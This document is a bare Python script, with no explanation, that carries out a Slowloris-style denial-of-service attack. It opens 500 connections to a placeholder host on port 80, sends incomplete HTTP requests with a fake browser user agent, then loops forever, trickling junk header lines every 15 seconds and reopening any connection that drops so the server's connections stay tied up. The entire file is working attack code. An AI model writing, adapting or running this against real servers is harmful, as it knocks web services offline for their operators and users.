import socket
import time
import random

host = "example.com"
port = 80
timeout = 5
socket_list = []

for i in range(500):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    socket_list.append(s)

for s in socket_list:
    s.connect((host, port))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode())
    s.send("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\r\n".encode())

while True:
    for s in socket_list:
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode())
        except socket.error:
            socket_list.remove(s)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode())
            s.send("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\r\n".encode())
            socket_list.append(s)
    time.sleep(15)
